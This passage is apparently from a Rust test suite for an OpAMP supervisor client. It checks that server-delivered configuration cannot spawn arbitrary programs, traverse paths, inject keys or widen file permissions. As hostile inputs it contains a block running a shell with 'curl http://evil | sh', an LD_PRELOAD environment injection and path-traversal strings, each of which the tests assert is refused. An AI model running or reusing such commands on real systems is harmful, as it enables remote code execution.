            assert!(err.contains("\"agent\""), "{err}");
            assert!(err.contains(key), "{err}");
            assert!(err.contains("remote_config_disabled"), "{err}");
        }
        let other_program = delivered(&format!(
            "[[supervisor]]\ntype = \"command\"\nname = \"agent\"\ncommand = \"other\"\n{body}"
        ));
        let err = crate::supervisor::check_delivered_block(&config, &other_program)
            .expect_err("another program under the listed name");
        assert!(err.contains("command"), "{err}");
        let other_kind = delivered(
            "[[supervisor]]\ntype = \"collector\"\nname = \"agent\"\nbinary = \"otelcol\"\n",
        );
        let err = crate::supervisor::check_delivered_block(&config, &other_kind)
            .expect_err("another kind under the listed name");
        assert!(err.contains("type"), "{err}");
        // An unlisted Supervisor under the same consent takes them, as ADR-0017 lets it.
        let unlisted = running(
            "[supervisors]\ndelivered_args = true\ndelivered_env = [\"*\"]\n",
            &operators,
        );
        crate::supervisor::check_delivered_block(
            &unlisted,
            &delivered(&format!(
                "{AGENT}args = [\"--other\"]\nenv = {{ OTEL_X = \"2\" }}\n"
            )),
        )
        .expect("consented");
    }

    /// A listed Supervisor that does not run yet is added naming its program and nothing else:
    /// `type`, `name` and the kind's program key where the kind does not name its own pass, and
    /// any further key — an empty one included — fails the offer naming it (ADR-0017 clause 54).
    /// Verifies: ADR-0017
    #[test]
    fn an_added_listed_supervisor_carries_only_what_names_its_program() {
        let config = running(LISTED_GLOBALS, "");
        for (key, line) in [
            ("args", "args = [\"--config=env:CFG\"]\n"),
            ("args", "args = []\n"),
            ("version_args", "version_args = [\"--version\"]\n"),
            ("env", "env = { CFG = \"receivers: {}\" }\n"),
            ("env", "env = {}\n"),
            ("service_name", "service_name = \"io.example.agent\"\n"),
            ("apply_grace_secs", "apply_grace_secs = 0\n"),
        ] {
            let err = crate::supervisor::check_delivered_block(
                &config,
                &delivered(&format!("{AGENT}{line}")),
            )
            .expect_err(key);
            assert!(err.contains(key) && err.contains("\"agent\""), "{err}");
        }
        crate::supervisor::check_delivered_block(&config, &delivered(AGENT)).expect("command");
        crate::supervisor::check_delivered_block(
            &config,
            &delivered(
                "[[supervisor]]\ntype = \"collector\"\nname = \"agent\"\nbinary = \"otelcol\"\n",
            ),
        )
        .expect("collector");
    }

    /// The switch lives where the Server cannot write: a set that removes the listed block and
    /// delivers it again starts an Agent still without `AcceptsRemoteConfig`, the written file
    /// keeps `[supervisors]` byte for byte, and a block bringing arguments fails the whole offer
    /// with the file untouched (ADR-0017 clauses 48 and 54).
    /// Verifies: ADR-0017
    #[tokio::test]
    async fn a_delivered_set_cannot_switch_remote_config_back_on_for_a_listed_name() {
        use opamp::proto::{AgentCapabilities, RemoteConfigStatuses};
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("supervisor.toml");
        let section = "[supervisors]\nremote_config_disabled = [\"agent\"]\n\
                       delivered_args = true\n";
        std::fs::write(
            &path,
            format!(
                "endpoint = \"ws://127.0.0.1:1/v1/opamp\"\nstate_dir = {state:?}\n\n\
                 {section}\n{AGENT}",
                state = dir.path().join("state").to_string_lossy(),
            ),
        )
        .expect("write");
        let mut config = ClientConfig::load(&path).expect("load");
        let (_tx, shutdown) = crate::shutdown::shutdown_channel();
        let mut engine = crate::supervisor::build_engine(&config, &shutdown).expect("build");
        let accepts = |report: &AgentToServer| {
            report.capabilities & AgentCapabilities::AcceptsRemoteConfig as u64 != 0
        };
        assert!(!accepts(&engine.poll_reports()[1]));

        let removing = offer_of(&[(
            "fleet",
            "[supervisors]\nremote_config_disabled = []\n\
             [[supervisor]]\ntype = \"command\"\nname = \"other\"\ncommand = \"agent\"\n",
        )]);
        apply(&mut engine, &mut config, removing, &shutdown).await;
        let readding = offer_of(&[("fleet", AGENT)]);
        apply(&mut engine, &mut config, readding, &shutdown).await;

        let reports = engine.poll_reports();
        assert_eq!(
            reports[0].remote_config_status.as_ref().map(|s| s.status),
            Some(RemoteConfigStatuses::Applied as i32),
            "{:?}",
            reports[0].remote_config_status
        );
        assert_eq!(
            reports.len(),
            2,
            "the Client's own Agent and the re-added one"
        );
        assert!(
            !accepts(&reports[1]),
            "the re-added Agent took the capability back"
        );
        let text = std::fs::read_to_string(&path).expect("read");
        assert!(text.contains(section), "{text}");

        let bringing = offer_of(&[(
            "fleet",
            &format!("{AGENT}args = [\"--config=yaml:receivers: {{}}\"]\n"),
        )]);
        apply(&mut engine, &mut config, bringing, &shutdown).await;
        let status = engine.poll_reports()[0]
            .remote_config_status
            .clone()
            .expect("a status");
        assert_eq!(status.status, RemoteConfigStatuses::Failed as i32);
        assert!(status.error_message.contains("args"), "{status:?}");
        assert_eq!(std::fs::read_to_string(&path).expect("read"), text);
    }

    /// ADR-0017: a Server-delivered block that names an **absolute** program path is refused as a
    /// whole — that is the machine's own process, and letting the Server spawn one would run
    /// arbitrary code that never passed through package signing. The refusal names the block and the
    /// path, and (being a validation failure) leaves the running set and the file untouched.
    /// An absolute path that is genuinely absolute on the host running the test — a Unix path is
    /// only drive-relative on Windows, which resolves to a different refusal, so each platform uses
    /// its own. Forward slashes keep it a plain TOML string and are absolute on Windows all the same.
    fn machine_program() -> &'static str {
        if cfg!(windows) {
            "C:/Windows/System32/cmd.exe"
        } else {
            "/bin/sh"
        }
    }

    /// The attack this guard stands against: a Server that delivers a block spawning a program on
    /// the machine with arguments of its choosing. It is refused a step earlier and for a broader
    /// reason (ADR-0017) — no block naming a program on the machine parses, from any principal —
    /// but the delivery path must still refuse it, which is what this asserts.
    #[test]
    fn a_server_delivered_block_may_not_name_an_absolute_program() {
        let program = machine_program();
        let offer = offer_of(&[(
            "fleet",
            &format!(
                "[[supervisor]]\ntype = \"command\"\nname = \"shell\"\n\
                 command = \"{program}\"\nargs = [\"-c\", \"curl http://evil | sh\"]\n"
            ),
        )]);
        let (blocks, _) = offered_blocks(&offer).expect("parse");
        let mut config: ClientConfig = toml::from_str("").expect("config");
        config.supervisors = blocks.clone();

        let err = validate_offered_block(&config, &blocks[0]).expect_err("absolute path refused");
        assert!(err.contains("\"shell\""), "names the block: {err}");
        assert!(err.contains("only programs it installs"), "{err}");
        assert!(err.contains(program), "names the path: {err}");
    }

    /// The counterpart: a bare file name is a program this Client owns (ADR-0017), so a delivered
    /// block that names one is accepted — the only shape there is.
    #[test]
    fn a_server_delivered_block_naming_a_bare_program_is_accepted() {
        let offer = offer_of(&[(
            "fleet",
            "[[supervisor]]\ntype = \"command\"\nname = \"agent\"\ncommand = \"agent\"\n",
        )]);
        let (blocks, _) = offered_blocks(&offer).expect("parse");
        let mut config: ClientConfig = toml::from_str("").expect("config");
        config.supervisors = blocks.clone();

        validate_offered_block(&config, &blocks[0]).expect("a bare-name program is owned");
    }

    /// The constraint reaches every plugin's program key: a `collector` block whose `binary` is an
    /// absolute path is the machine's Collector, refused on the delivery path just like `command`.
    #[test]
    fn a_delivered_collector_binary_must_be_owned_too() {
        let program = machine_program();
        let offer = offer_of(&[(
            "fleet",
            &format!(
                "[[supervisor]]\ntype = \"collector\"\nname = \"otelcol\"\nbinary = \"{program}\"\n"
            ),
        )]);
        let (blocks, _) = offered_blocks(&offer).expect("parse");
        let mut config: ClientConfig = toml::from_str("").expect("config");
        config.supervisors = blocks.clone();

        let err = validate_offered_block(&config, &blocks[0]).expect_err("absolute binary refused");
        assert!(err.contains("only programs it installs"), "{err}");
        assert!(err.contains(program), "{err}");
    }

    /// The composed map may spread blocks over several entries (one per matching Configuration);
    /// the union is the set, in entry-name order.
    #[test]
    fn blocks_are_collected_across_entries_in_name_order() {
        let offer = offer_of(&[
            (
                "b-second",
                "[[supervisor]]\ntype = \"command\"\nname = \"two\"\ncommand = \"two\"\n",
            ),
            (
                "a-first",
                "[[supervisor]]\ntype = \"command\"\nname = \"one\"\ncommand = \"one\"\n",
            ),
        ]);
        let (blocks, _) = offered_blocks(&offer).expect("parse");
        let names: Vec<&str> = blocks.iter().map(|b| b.name.as_str()).collect();
        assert_eq!(names, vec!["one", "two"]);
    }

    /// The write replaces exactly the `[[supervisor]]` blocks. Everything the operator wrote —
    /// comments, ordering, unrelated sections — survives byte for byte (ADR-0017 point 31).
    // Verifies: ADR-0017
    #[test]
    fn the_write_replaces_blocks_and_keeps_the_operators_file() {
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("supervisor.toml");
        std::fs::write(
            &path,
            "# where the fleet lives\nendpoint = \"wss://fleet.example:4320/v1/opamp\"\n\n\
             # tuned by hand\nmax_message_size_bytes = 8388608\n\n\
             [[supervisor]]\ntype = \"command\"\nname = \"old\"\ncommand = \"old\"\n",
        )
        .expect("write");

        let offer = offer_of(&[(
            "fleet",
            "# rolled out fleet-wide\n[[supervisor]]\ntype = \"command\"\nname = \"new\"\ncommand = \"new\"\n",
        )]);
        let (_, tables) = offered_blocks(&offer).expect("parse");
        let text = write_supervisors(&path, tables).expect("rewrite");

        assert!(text.contains("# where the fleet lives"));
        assert!(text.contains("# tuned by hand"));
        assert!(text.contains("max_message_size_bytes = 8388608"));
        assert!(text.contains("name = \"new\""));
        assert!(!text.contains("\"old\""));
        assert_eq!(std::fs::read_to_string(&path).expect("read back"), text);
        // And the result is a valid configuration the next startup will load.
        let parsed: ClientConfig = toml::from_str(&text).expect("the rewritten file parses");
        assert_eq!(parsed.supervisors.len(), 1);
        assert_eq!(parsed.supervisors[0].name, "new");
    }

    /// A delivered set reaches no key of `supervisor.toml` but the `[[supervisor]]` array: whatever
    /// else it names — an `[auth]` section, trust, the verification key, a removed key such as
    /// `allowed_sources`, the
    /// operator's consent in `[supervisors]`, self-update, Gateway Mode — the file keeps the
    /// operator's values and gains none of the offered ones.
    /// Verifies: ADR-0017
    #[test]
    fn a_delivered_set_writes_nothing_beyond_the_supervisor_blocks() {
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("supervisor.toml");
        let operator = "endpoint = \"wss://fleet.example:4320/v1/opamp\"\n\n\
                        [packages]\nverification_key = \"aa\"\n\
                        archive_key = \"operator-secret\"\n";
        std::fs::write(&path, operator).expect("write");

        let offer = offer_of(&[(
            "fleet",
            r#"
            [auth]
            bearer_token = "server-token"

            [tls]
            ca_file = "/tmp/server-ca.pem"

            [packages]
            self_update = false
            verification_key = "bb"
            allowed_sources = ["https://evil.example/"]

            [supervisors]
            delivered_args = true
            delivered_env = ["LD_PRELOAD"]

            [gateway]
            listen = "0.0.0.0:4320"

            [[supervisor]]
            type = "command"
            name = "agent"
            command = "agent"
            "#,
        )]);
        let (blocks, tables) = offered_blocks(&offer).expect("parse");
        assert_eq!(blocks.len(), 1);
        let text = render_supervisors(&path, tables).expect("render");
        for offered in [
            "server-token",
            "server-ca.pem",
            "\"bb\"",
            "evil.example",
            "delivered_args",
            "LD_PRELOAD",
            "self_update",
            "[gateway]",
        ] {
            assert!(
                !text.contains(offered),
                "{offered} reached the file:\n{text}"
            );
        }
        let parsed: ClientConfig = toml::from_str(&text).expect("the file parses");
        assert_eq!(parsed.endpoint, "wss://fleet.example:4320/v1/opamp");
        assert!(text.contains("operator-secret"));
        assert!(text.contains("verification_key = \"aa\""));
        assert_eq!(parsed.supervisors.len(), 1);
    }

    /// A delivered block of a kind this Client was not built with is refused, naming the kind —
    /// a Server cannot conjure a Supervisor type.
    /// Verifies: ADR-0017
    #[test]
    fn a_delivered_block_of_an_unknown_type_is_refused() {
        let offer = offer_of(&[(
            "fleet",
            "[[supervisor]]\ntype = \"shell\"\nname = \"agent\"\ncommand = \"agent\"\n",
        )]);
        let dir = tempfile::tempdir().expect("tempdir");
        let config = ClientConfig {
            state_dir: dir.path().to_path_buf(),
            ..ClientConfig::default()
        };
        let (blocks, _) = offered_blocks(&offer).expect("parse");
        let err = validate_offered_block(&config, &blocks[0]).expect_err("an unknown type");
        assert!(err.contains("shell"), "{err}");
    }

    /// Neither a delivered Supervisor name nor a delivered program name can leave the directories
    /// this Client owns: a name is one path component of a fixed grammar, and a program a bare
    /// file name inside `program/`.
    /// Verifies: ADR-0017
    #[test]
    fn a_delivered_name_or_program_that_traverses_is_refused() {
        for name in ["..", "../etc", "a/b", "a\\b", "Agent"] {
            let offer = offer_of(&[(
                "fleet",
                &format!(
                    "[[supervisor]]\ntype = \"command\"\nname = {name:?}\ncommand = \"agent\"\n"
                ),
            )]);
            assert!(
                offered_blocks(&offer).is_err(),
                "the Supervisor name {name:?} was accepted"
            );
        }
        let dir = tempfile::tempdir().expect("tempdir");
        let config = ClientConfig {
            state_dir: dir.path().to_path_buf(),
            ..ClientConfig::default()
        };
        for program in ["../../bin/sh", "sub/../../sh", "..", "sub/agent"] {
            let block = delivered(&format!(
                "[[supervisor]]\ntype = \"command\"\nname = \"agent\"\ncommand = {program:?}\n"
            ));
            assert!(
                validate_offered_block(&config, &block).is_err(),
                "the program {program:?} was accepted"
            );
        }
    }

    /// `supervisor.toml` may hold the archive key in cleartext and is created `0600`; the rewrite must
    /// not widen it. Before the fix, writing the temp file at the default umask and renaming it over
    /// the original left the file (and the secret) world-readable after a Server reconfigure.
    #[cfg(unix)]
    #[test]
    fn the_rewrite_keeps_the_files_restrictive_mode() {
        use std::os::unix::fs::PermissionsExt as _;

        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("supervisor.toml");
        std::fs::write(
            &path,
            "endpoint = \"wss://fleet.example:4320/v1/opamp\"\n\n\
             [packages]\narchive_key = \"a-long-secret\"\n\n\
             [[supervisor]]\ntype = \"command\"\nname = \"old\"\ncommand = \"old\"\n",
        )
        .expect("write");
        // As the Client creates it (config_init::write_new): owner-only.
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o600)).expect("chmod");

        let offer = offer_of(&[(
            "fleet",
            "[[supervisor]]\ntype = \"command\"\nname = \"new\"\ncommand = \"new\"\n",
        )]);
        let (_, tables) = offered_blocks(&offer).expect("parse");
        write_supervisors(&path, tables).expect("rewrite");

        let mode = std::fs::metadata(&path).expect("stat").permissions().mode() & 0o777;
        assert_eq!(
            mode, 0o600,
            "the rewrite kept the file owner-only, got {mode:o}"
        );
        // No temporary file is left behind carrying the same secret.
        assert!(
            !path.with_extension("toml.tmp").exists(),
            "no temp left behind"
        );
    }

    /// A file that does not exist yet is created no wider than the `0600` floor `write_new` uses —
    /// a delivered set that first materializes `supervisor.toml` must not do so world-readable.
    #[cfg(unix)]
    #[test]
    fn a_freshly_created_file_is_owner_only() {
        use std::os::unix::fs::PermissionsExt as _;

        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("supervisor.toml");
        let offer = offer_of(&[(
            "fleet",
            "[[supervisor]]\ntype = \"command\"\nname = \"new\"\ncommand = \"new\"\n",
        )]);
        let (_, tables) = offered_blocks(&offer).expect("parse");
        write_supervisors(&path, tables).expect("rewrite");

        let mode = std::fs::metadata(&path).expect("stat").permissions().mode() & 0o777;
        assert_eq!(mode, 0o600, "a new file is owner-only, got {mode:o}");
    }

    /// ADR-0017: the apply is a diff by name. An unchanged block rides through — neither stopped
    /// nor started — a changed one is stopped and started but keeps its directory, a vanished one
    /// is stopped and removed, and a new one is only started (point 14: removal is keyed by name).
    /// Verifies: ADR-0017
    #[test]
    fn the_plan_is_a_diff_by_name_and_unchanged_blocks_ride_through() {
        let parse = |text: &str| -> Vec<SupervisorBlock> {
            let config: ClientConfig = toml::from_str(text).expect("parse");
            config.supervisors
        };
        let running = parse(
            "[[supervisor]]\ntype = \"command\"\nname = \"kept\"\ncommand = \"same\"\n\
             [[supervisor]]\ntype = \"command\"\nname = \"changed\"\ncommand = \"old\"\n\
             [[supervisor]]\ntype = \"command\"\nname = \"gone\"\ncommand = \"gone\"\n",
        );
        let offered = parse(
            "[[supervisor]]\ntype = \"command\"\nname = \"kept\"\ncommand = \"same\"\n\
             [[supervisor]]\ntype = \"command\"\nname = \"changed\"\ncommand = \"new\"\n\
             [[supervisor]]\ntype = \"command\"\nname = \"added\"\ncommand = \"new\"\n",
        );
        assert_eq!(
            plan(&running, &offered),
            Plan {
                stopping: vec!["changed".to_string(), "gone".to_string()],
                starting: vec!["changed".to_string(), "added".to_string()],
                removed: vec!["gone".to_string()],
            }
        );
    }

    /// ADR-0017: the purge deletes exactly the removed Supervisor's directory — whole, identity
    /// included — leaves the neighbours untouched, and a directory that never materialized is
    /// nothing to report.
    // Verifies: ADR-0017
    #[test]
    fn the_purge_deletes_exactly_the_removed_supervisors_directory() {
        let dir = tempfile::tempdir().expect("tempdir");
        let config: ClientConfig = toml::from_str(&format!(
            "supervisor_dir = {:?}",
            dir.path().join("supervisors").to_string_lossy()
        ))
        .expect("config");
        let gone = config.supervisor_dir("gone");
        let stays = config.supervisor_dir("stays");
        std::fs::create_dir_all(gone.join("program")).expect("create");
        std::fs::write(gone.join("instance-uid"), "uid").expect("write");
        std::fs::create_dir_all(&stays).expect("create");
        std::fs::write(stays.join("instance-uid"), "uid").expect("write");

        purge_removed(&config, &["gone".to_string(), "never-started".to_string()]);

        assert!(!gone.exists(), "the removed supervisor's directory is gone");
        assert!(
            stays.join("instance-uid").is_file(),
            "a neighbour keeps its directory and identity"
        );
    }

    /// A compromised Server purges a Supervisor and adds it back to reset its floor: `a` of type
    /// `otelcol` installs `0.110.0`, a set without `a` purges it, and sets adding `b` and then `a`
    /// again follow. The mark file survives the purge — here with `supervisor_dir` at `state_dir`
    /// itself — and each re-added Supervisor refuses `0.109.0` naming the mark, and takes
    /// `0.110.0+other` and `0.111.0` (ADR-0043 clauses 8 and 14).
    /// Verifies: ADR-0043
    #[test]
    fn a_purged_and_re_added_supervisor_is_held_to_its_types_mark() {
        use crate::storage::{HighWaterFile, Storage, HIGH_WATER_FILE};
        use crate::supervisor::agent::AgentState;
        use crate::supervisor::ports::HighWaterMarks;
        use opamp::proto::ServerToAgent;
        use std::sync::Arc;

        let dir = tempfile::tempdir().expect("tempdir");
        let state = dir.path().join("state");
        let config: ClientConfig = toml::from_str(&format!(
            "state_dir = {state:?}\nsupervisor_dir = {state:?}",
            state = state.to_string_lossy()
        ))
        .expect("config");
        let marks: Arc<dyn HighWaterMarks> = Arc::new(HighWaterFile::open(&config.state_dir));
        let supervisor = |name: &str| {
            let mut agent = AgentState::supervised(
                name.to_string(),
                "otelcol".to_string(),
                Storage::new(config.supervisor_dir(name)).expect("storage"),
                crate::host::SystemHost,
            )
            .expect("agent")
            .with_high_water(marks.clone());
            agent.accept_packages();
            let _ = agent.next_report();
            agent
        };
        let offer = |agent: &mut AgentState, version: &str| {
            let handled = agent.handle(&ServerToAgent {
                packages_available: Some(opamp::proto::PackagesAvailable {
                    packages: [(
                        "otelcol".to_string(),
                        opamp::proto::PackageAvailable {
                            version: version.to_string(),
                            file: Some(opamp::proto::DownloadableFile {
                                download_url: "/x".to_string(),
                                content_hash: b"chash".to_vec(),
                                ..Default::default()
                            }),
                            hash: version.as_bytes().to_vec(),
                            ..Default::default()
                        },
                    )]
                    .into(),
                    all_packages_hash: version.as_bytes().to_vec(),
                }),
                ..Default::default()
            });
            let statuses = agent.next_report().package_statuses.expect("statuses");
            (handled.package_download.is_some(), statuses.error_message)
        };

        let mut a = supervisor("a");
        assert!(offer(&mut a, "0.110.0").0);
        a.package_applied(b"0.110.0".to_vec(), Ok("0.110.0".to_string()));
        drop(a);
        purge_removed(&config, &["a".to_string()]);
        assert!(!config.supervisor_dir("a").exists(), "a is purged");
        assert!(
            state.join(HIGH_WATER_FILE).is_file(),
            "the purge leaves the mark file"
        );

        for name in ["b", "a"] {
            let mut readded = supervisor(name);
            let (downloads, why) = offer(&mut readded, "0.109.0");
            assert!(!downloads, "{name}: nothing below the mark is fetched");
            assert!(
                why.contains("0.110.0"),
                "{name}: the refusal names the mark: {why}"
            );
            assert!(
                offer(&mut readded, "0.110.0+other").0,
                "{name}: equal is taken"
            );
            assert!(offer(&mut readded, "0.111.0").0, "{name}: newer is taken");
            drop(readded);
            purge_removed(&config, &[name.to_string()]);
        }
    }

    /// ADR-0017 hardening: the purge never recurses through a symlink planted where a Supervisor's
    /// directory should be — it removes the link, not what it points at. A `name` cannot itself
    /// traverse (ADR-0017), so this is the only way the delete could have escaped, and it does not.
    #[cfg(unix)]
    #[test]
    fn the_purge_does_not_follow_a_symlink_out_of_the_supervisors_root() {
        let dir = tempfile::tempdir().expect("tempdir");
        let config: ClientConfig = toml::from_str(&format!(
            "supervisor_dir = {:?}",
            dir.path().join("supervisors").to_string_lossy()
        ))
        .expect("config");

        // A precious directory outside the supervisors root, with a file the purge must not touch.
        let outside = dir.path().join("precious");
        std::fs::create_dir_all(&outside).expect("create");
        std::fs::write(outside.join("keep"), "important").expect("write");

        // A Supervisor directory that is really a symlink pointing at it.
        std::fs::create_dir_all(config.supervisors_root()).expect("root");
        let link = config.supervisor_dir("evil");
        std::os::unix::fs::symlink(&outside, &link).expect("symlink");

        purge_removed(&config, &["evil".to_string()]);

        assert!(
            outside.join("keep").is_file(),
            "the symlink target and its contents survive"
        );
        assert!(!link.exists(), "the stray symlink itself is removed");
    }

    /// An offer whose entries carry no blocks empties the set: the file keeps its globals and
    /// loses its `[[supervisor]]` blocks.
    #[test]
    fn an_empty_offer_removes_every_block() {
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("supervisor.toml");
        std::fs::write(
            &path,
            "endpoint = \"wss://fleet.example:4320/v1/opamp\"\n\n\
             [[supervisor]]\ntype = \"command\"\nname = \"old\"\ncommand = \"old\"\n",
        )
        .expect("write");
        let (blocks, tables) = offered_blocks(&offer_of(&[("fleet", "")])).expect("parse");
        assert!(blocks.is_empty());
        let text = write_supervisors(&path, tables).expect("rewrite");
        assert!(!text.contains("supervisor"), "{text}");
        assert!(text.contains("endpoint"), "{text}");
    }
}
